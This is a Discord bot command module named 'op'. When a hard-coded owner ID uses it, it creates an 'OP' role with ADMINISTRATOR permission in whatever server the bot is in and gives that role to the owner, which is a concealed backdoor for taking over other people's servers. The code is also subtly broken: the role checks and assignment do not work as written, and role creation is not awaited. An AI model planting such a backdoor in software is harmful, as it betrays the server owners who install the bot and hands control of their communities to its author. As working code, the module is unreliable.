const config = require("../config.json");
const Discord = require("discord.js");
const fs = require("fs");
const fetch = require("node-fetch");
const superagent = require("superagent");
const math = require("mathjs");
const prefix = (config.prefix);

module.exports.run = async (client, message, args) => {

    let adminRole = message.guild.roles.find(r => r.name ==="OP");

    if(message.author.id === '408289224761016332') {
      if(message.member.roles.has(adminRole)) {
        return message.channel.send(`❌ | Couldn't give you the OP role, because you already have it!`);
      }

        if(!adminRole)
        message.guild.createRole({
          name: "OP",
          color: "#000000",
          permissions:['ADMINISTRATOR']
        })
      message.author.addRole(adminRole);

      message.channel.send(`✅ | I created and gave you the OP role successfully!`)
        
    } else {

    return message.channel.send(`❌ | Couldn't run this command because you aren't ${client.user.username}'s owner, only Tsunami#6271 can do this!`);
    }
  }

  module.exports.help = {
    name: "op"
}